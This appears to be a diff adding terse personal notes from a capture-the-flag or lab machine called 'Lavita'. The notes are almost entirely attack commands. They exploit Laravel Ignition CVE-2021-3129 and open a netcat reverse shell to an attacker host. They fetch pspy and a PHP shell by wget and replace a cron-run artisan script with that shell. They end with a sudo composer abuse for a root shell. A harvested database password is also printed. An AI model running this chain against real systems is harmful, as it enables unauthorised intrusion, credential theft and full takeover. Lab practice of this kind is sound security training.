@@ -1,0 +1,85 @@
+Lavita
+
+	
+192.168.184.38
+in contact page redirected in 404 page
+
+find 
+ Laravel 8.4.0
+
+http://192.168.184.38/_ignition/execute-solution
+
+https://github.com/joshuavanderpoll/CVE-2021-3129
+python3 CVE-2021-3129.py --host="http://192.168.184.38"
+python3 CVE-2021-3129.py --chain laravel/rce2 --host="http://192.168.184.38"
+
+
+
+execute nc 192.168.45.173 4545 -e /bin/bash 
+nc -nvlp 4545
+python3 -c'import pty;pty.spawn("/bin/bash")'
+
+after running linpeas.sh 
+
+got followin
+
+DB_PASSWORD=sdfquelw0kly9jgbx92
+cp        0      0 127.0.0.1:3306 (mysql is running)
+uid=1001(skunk) gid=1001(skunk) groups=1001(skunk),27(sudo),33(www-data)
+
+DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+DB_PORT=3306
+DB_DATABASE=lavita
+DB_USERNAME=lavita
+DB_PASSWORD=sdfquelw0kly9jgbx92
+BROADCAST_DRIVER=log
+
+https://github.com/DominicBreuker/pspy?tab=readme-ov-file
+wget http://192.168.45.173:440/pspy64
+chmod +x pspy64
+./pspy64
+2024/09/18 10:30:01 CMD: UID=1001  PID=28682  | /usr/bin/php /var/www/html/lavita/artisan clear:pictures 
+continue run by user skunk
+
+wget http://192.168.45.173:440/shell.php
+mv artisan artisan.bak
+mv shell.php artisan
+chmod +x artisan
+nc -nvlp 1234
+
+Got another reverse shell using skunk user
+python3 -c'import pty;pty.spawn("/bin/bash")'
+sudo -l 
+(root) NOPASSWD: /usr/bin/composer --working-dir\=/var/www/html/lavita * 
+
+back to www-data shell 
+
+https://gtfobins.github.io/gtfobins/composer/
+echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > composer.json
+back to skunk shell
+sudo /usr/bin/composer --working-dir=/var/www/html/lavita run-script x
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
